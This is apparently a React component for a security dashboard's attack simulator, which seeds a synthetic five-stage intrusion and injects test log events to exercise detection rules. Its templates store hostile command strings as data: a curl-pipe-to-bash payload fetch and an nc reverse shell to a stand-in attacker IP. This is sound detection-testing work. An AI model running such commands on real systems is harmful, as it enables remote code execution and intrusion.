import React, { useState } from 'react';
import {
  Zap,
  Play,
  RotateCcw,
  CheckCircle,
  AlertTriangle,
  Send,
  Sparkles,
  Terminal,
  Shield,
  Layers,
} from 'lucide-react';
import { ingestLog, seedSampleAttack, resetDatabase } from '../services/api';

interface AttackSimulatorProps {
  onSimulationCompleted: () => void;
}

export const AttackSimulator: React.FC<AttackSimulatorProps> = ({ onSimulationCompleted }) => {
  const [isSimulating, setIsSimulating] = useState(false);
  const [isResetting, setIsResetting] = useState(false);
  const [simulationStatus, setSimulationStatus] = useState<string | null>(null);

  // Manual Log Injection State
  const [hostname, setHostname] = useState('prod-db-01.corp.internal');
  const [eventType, setEventType] = useState('auth');
  const [status, setStatus] = useState('failure');
  const [sourceIp, setSourceIp] = useState('198.51.100.42');
  const [username, setUsername] = useState('deploy');
  const [processName, setProcessName] = useState('sshd');
  const [command, setCommand] = useState('');
  const [rawMessage, setRawMessage] = useState('Failed password for user deploy from 198.51.100.42 port 49120 ssh2');
  const [isInjecting, setIsInjecting] = useState(false);
  const [injectionFeedback, setInjectionFeedback] = useState<any>(null);

  const handleRunFullAttack = async () => {
    try {
      setIsSimulating(true);
      setSimulationStatus('Executing 5-stage cyber intrusion sequence...');
      const res = await seedSampleAttack();
      setSimulationStatus(
        `Simulation successfully completed! Generated ${res.result?.logs_created || 10} logs, triggered ${
          res.result?.alerts_created || 5
        } detections, and correlated into an active incident.`
      );
      onSimulationCompleted();
    } catch (err: any) {
      setSimulationStatus(`Simulation failed: ${err.message}`);
    } finally {
      setIsSimulating(false);
    }
  };

  const handleReset = async () => {
    if (!window.confirm('Are you sure you want to clear all logs, alerts, and incidents from the database?')) {
      return;
    }
    try {
      setIsResetting(true);
      await resetDatabase();
      setSimulationStatus('Database cleared.');
      onSimulationCompleted();
    } catch (err: any) {
      setSimulationStatus(`Reset failed: ${err.message}`);
    } finally {
      setIsResetting(false);
    }
  };

  const applyTemplate = (template: string) => {
    if (template === 'ssh_fail') {
      setHostname('prod-db-01.corp.internal');
      setEventType('auth');
      setStatus('failure');
      setSourceIp('198.51.100.42');
      setUsername('root');
      setProcessName('sshd');
      setCommand('');
      setRawMessage('sshd[9441]: Failed password for invalid user root from 198.51.100.42 port 50220 ssh2');
    } else if (template === 'ssh_success') {
      setHostname('prod-db-01.corp.internal');
      setEventType('auth');
      setStatus('success');
      setSourceIp('198.51.100.42');
      setUsername('deploy');
      setProcessName('sshd');
      setCommand('');
      setRawMessage('sshd[9450]: Accepted password for deploy from 198.51.100.42 port 50222 ssh2');
    } else if (template === 'priv_esc') {
      setHostname('prod-db-01.corp.internal');
      setEventType('privilege');
      setStatus('success');
      setUsername('deploy');
      setProcessName('sudo');
      setCommand('sudo /bin/bash');
      setRawMessage('sudo: deploy : TTY=pts/2 ; USER=root ; COMMAND=/bin/bash');
    } else if (template === 'susp_proc') {
      setHostname('prod-db-01.corp.internal');
      setEventType('process');
      setStatus('success');
      setUsername('www-data');
      setProcessName('bash');
      setCommand("bash -c 'curl -s http://198.51.100.42/payload.sh | bash'");
      setRawMessage("auditd: execve parent=nginx child=bash cmd='curl -s http://198.51.100.42/payload.sh | bash'");
    } else if (template === 'c2_socket') {
      setHostname('prod-db-01.corp.internal');
      setEventType('network');
      setStatus('success');
      setSourceIp('10.0.1.50');
      setUsername('root');
      setProcessName('nc');
      setCommand('nc -e /bin/bash 198.51.100.42 4444');
      setRawMessage('kernel: [FIREWALL] Outbound TCP socket: 10.0.1.50:49200 -> 198.51.100.42:4444 [ESTABLISHED]');
    }
  };

  const handleManualInject = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      setIsInjecting(true);
      setInjectionFeedback(null);
      const res = await ingestLog({
        hostname,
        event_type: eventType,
        status,
        source_ip: sourceIp || undefined,
        username: username || undefined,
        process: processName || undefined,
        command: command || undefined,
        raw_message: rawMessage,
      });
      setInjectionFeedback(res);
      onSimulationCompleted();
    } catch (err: any) {
      setInjectionFeedback({ error: err.message });
    } finally {
      setIsInjecting(false);
    }
  };

  return (
    <div className="space-y-6">
      {/* 1. Automated Multi-Stage Attack Chain Card */}
      <div className="p-6 rounded-2xl bg-gradient-to-br from-slate-900 via-slate-900 to-slate-950 border border-slate-800 shadow-md">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-slate-800">
          <div>
            <div className="flex items-center gap-2">
              <span className="p-1.5 rounded-lg bg-rose-500/10 border border-rose-500/30 text-rose-400">
                <Zap className="w-5 h-5" />
              </span>
              <h3 className="text-lg font-bold text-white">Full-Chain Cyber Attack Simulator</h3>
            </div>
            <p className="text-xs text-slate-400 mt-1">
              Injects a correlated 5-stage advanced persistent threat (APT) sequence to evaluate end-to-end detection, correlation, and AI triage.
            </p>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={handleReset}
              disabled={isResetting || isSimulating}
              className="flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition disabled:opacity-50"
            >
              <RotateCcw className={`w-3.5 h-3.5 ${isResetting ? 'animate-spin' : ''}`} />
              <span>Reset DB</span>
            </button>

            <button
              id="execute-full-attack-btn"
              onClick={handleRunFullAttack}
              disabled={isSimulating}
              className="flex items-center gap-2 px-4 py-2 rounded-lg text-xs font-bold bg-rose-600 hover:bg-rose-500 text-white shadow-lg shadow-rose-900/40 transition disabled:opacity-50"
            >
              <Play className={`w-3.5 h-3.5 ${isSimulating ? 'animate-spin' : ''}`} />
              <span>{isSimulating ? 'Executing Simulation...' : 'Simulate 5-Stage Attack Chain'}</span>
            </button>
          </div>
        </div>

        {/* Visual 5-Stage Pipeline Cards */}
        <div className="grid grid-cols-1 sm:grid-cols-5 gap-3 mt-6">
          <div className="p-3 rounded-xl bg-slate-950/70 border border-slate-800 text-xs space-y-1">
            <div className="font-mono text-[10px] text-cyan-400 font-bold">STAGE 1 &bull; T1110</div>
            <div className="font-semibold text-white">SSH Brute Force</div>
            <p className="text-slate-400 text-[11px]">6 failed logins from 198.51.100.42</p>
          </div>

          <div className="p-3 rounded-xl bg-slate-950/70 border border-slate-800 text-xs space-y-1">
            <div className="font-mono text-[10px] text-rose-400 font-bold">STAGE 2 &bull; T1078</div>
            <div className="font-semibold text-white">Account Compromise</div>
            <p className="text-slate-400 text-[11px]">Accepted login for user deploy</p>
          </div>

          <div className="p-3 rounded-xl bg-slate-950/70 border border-slate-800 text-xs space-y-1">
            <div className="font-mono text-[10px] text-orange-400 font-bold">STAGE 3 &bull; T1548</div>
            <div className="font-semibold text-white">Privilege Escalation</div>
            <p className="text-slate-400 text-[11px]">sudo /bin/bash execution</p>
          </div>

          <div className="p-3 rounded-xl bg-slate-950/70 border border-slate-800 text-xs space-y-1">
            <div className="font-mono text-[10px] text-amber-400 font-bold">STAGE 4 &bull; T1059</div>
            <div className="font-semibold text-white">Suspicious Process</div>
            <p className="text-slate-400 text-[11px]">nginx spawns bash shell script</p>
          </div>

          <div className="p-3 rounded-xl bg-slate-950/70 border border-slate-800 text-xs space-y-1">
            <div className="font-mono text-[10px] text-purple-400 font-bold">STAGE 5 &bull; T1071</div>
            <div className="font-semibold text-white">C2 Exfiltration</div>
            <p className="text-slate-400 text-[11px]">TCP socket to port 4444</p>
          </div>
        </div>

        {/* Simulation Feedback Alert */}
        {simulationStatus && (
          <div className="mt-4 p-3 rounded-lg bg-slate-950 border border-slate-800 text-xs text-slate-200 flex items-center gap-2">
            <CheckCircle className="w-4 h-4 text-emerald-400 shrink-0" />
            <span>{simulationStatus}</span>
          </div>
        )}
      </div>

      {/* 2. Manual Custom Log Injection Form */}
      <div className="p-6 rounded-2xl bg-slate-900 border border-slate-800 shadow-md">
        <div className="mb-4">
          <h3 className="text-base font-bold text-white flex items-center gap-2">
            <Terminal className="w-4 h-4 text-cyan-400" />
            Interactive Custom Event Injector
          </h3>
          <p className="text-xs text-slate-400 mt-0.5">
            Inject arbitrary telemetry into the pipeline to test rule detection thresholds and correlation live.
          </p>
        </div>

        {/* Quick Templates */}
        <div className="mb-5 flex flex-wrap items-center gap-2 text-xs">
          <span className="text-slate-400 font-medium">Quick Attack Templates:</span>
          <button
            type="button"
            onClick={() => applyTemplate('ssh_fail')}
            className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition"
          >
            Failed SSH Attempt
          </button>
          <button
            type="button"
            onClick={() => applyTemplate('ssh_success')}
            className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition"
          >
            Successful Login
          </button>
          <button
            type="button"
            onClick={() => applyTemplate('priv_esc')}
            className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition"
          >
            sudo bash (PrivEsc)
          </button>
          <button
            type="button"
            onClick={() => applyTemplate('susp_proc')}
            className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition"
          >
            Web Shell Spawn
          </button>
          <button
            type="button"
            onClick={() => applyTemplate('c2_socket')}
            className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition"
          >
            C2 Reverse Shell (Port 4444)
          </button>
        </div>

        <form onSubmit={handleManualInject} className="space-y-4">
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
            <div>
              <label className="block text-slate-400 mb-1">Target Hostname</label>
              <input
                type="text"
                value={hostname}
                onChange={(e) => setHostname(e.target.value)}
                required
                className="w-full px-3 py-1.5 rounded bg-slate-950 border border-slate-800 text-slate-200 focus:outline-none focus:border-cyan-500 font-mono"
              />
            </div>

            <div>
              <label className="block text-slate-400 mb-1">Event Type</label>
              <select
                value={eventType}
                onChange={(e) => setEventType(e.target.value)}
                className="w-full px-3 py-1.5 rounded bg-slate-950 border border-slate-800 text-slate-200 focus:outline-none focus:border-cyan-500 font-mono"
              >
                <option value="auth">auth</option>
                <option value="process">process</option>
                <option value="privilege">privilege</option>
                <option value="network">network</option>
              </select>
            </div>

            <div>
              <label className="block text-slate-400 mb-1">Execution Status</label>
              <select
                value={status}
                onChange={(e) => setStatus(e.target.value)}
                className="w-full px-3 py-1.5 rounded bg-slate-950 border border-slate-800 text-slate-200 focus:outline-none focus:border-cyan-500 font-mono"
              >
                <option value="failure">failure / denied</option>
                <option value="success">success</option>
              </select>
            </div>

            <div>
              <label className="block text-slate-400 mb-1">Source IP</label>
              <input
                type="text"
                value={sourceIp}
                onChange={(e) => setSourceIp(e.target.value)}
                className="w-full px-3 py-1.5 rounded bg-slate-950 border border-slate-800 text-slate-200 focus:outline-none focus:border-cyan-500 font-mono"
              />
            </div>

            <div>
              <label className="block text-slate-400 mb-1">Username</label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full px-3 py-1.5 rounded bg-slate-950 border border-slate-800 text-slate-200 focus:outline-none focus:border-cyan-500 font-mono"
              />
            </div>

            <div>
              <label className="block text-slate-400 mb-1">Process / Binary</label>
              <input
                type="text"
                value={processName}
                onChange={(e) => setProcessName(e.target.value)}
                className="w-full px-3 py-1.5 rounded bg-slate-950 border border-slate-800 text-slate-200 focus:outline-none focus:border-cyan-500 font-mono"
              />
            </div>
          </div>

          <div className="text-xs">
            <label className="block text-slate-400 mb-1">Command String (Optional)</label>
            <input
              type="text"
              value={command}
              onChange={(e) => setCommand(e.target.value)}
              placeholder="e.g. sudo /bin/bash"
              className="w-full px-3 py-1.5 rounded bg-slate-950 border border-slate-800 text-slate-200 focus:outline-none focus:border-cyan-500 font-mono"
            />
          </div>

          <div className="text-xs">
            <label className="block text-slate-400 mb-1">Raw Syslog / Audit Message</label>
            <textarea
              rows={2}
              value={rawMessage}
              onChange={(e) => setRawMessage(e.target.value)}
              required
              className="w-full px-3 py-1.5 rounded bg-slate-950 border border-slate-800 text-slate-200 focus:outline-none focus:border-cyan-500 font-mono"
            />
          </div>

          <div className="flex items-center justify-between pt-2">
            <span className="text-xs text-slate-500">
              Injected events immediately evaluate through all 5 detection rules and correlation.
            </span>
            <button
              type="submit"
              disabled={isInjecting}
              className="flex items-center gap-1.5 px-4 py-2 rounded-lg text-xs font-bold bg-cyan-500 hover:bg-cyan-400 text-slate-950 transition disabled:opacity-50"
            >
              <Send className="w-3.5 h-3.5" />
              <span>{isInjecting ? 'Ingesting...' : 'Ingest Event Telemetry'}</span>
            </button>
          </div>
        </form>

        {/* Real-time Injection Feedback */}
        {injectionFeedback && (
          <div className="mt-4 p-3 rounded-lg bg-slate-950 border border-slate-800 text-xs">
            {injectionFeedback.error ? (
              <span className="text-rose-400">Error: {injectionFeedback.error}</span>
            ) : (
              <div className="space-y-1">
                <div className="text-emerald-400 font-semibold flex items-center gap-1.5">
                  <CheckCircle className="w-4 h-4" />
                  Log #{injectionFeedback.log_id} Ingested and Evaluated Successfully
                </div>
                <div className="text-slate-300">
                  Alerts Triggered: <strong>{injectionFeedback.alerts_triggered}</strong> &bull; Incident:{' '}
                  {injectionFeedback.incident_id ? (
                    <strong className="text-cyan-400">INC-{injectionFeedback.incident_id} Updated</strong>
                  ) : (
                    'None (Threshold not met)'
                  )}
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};
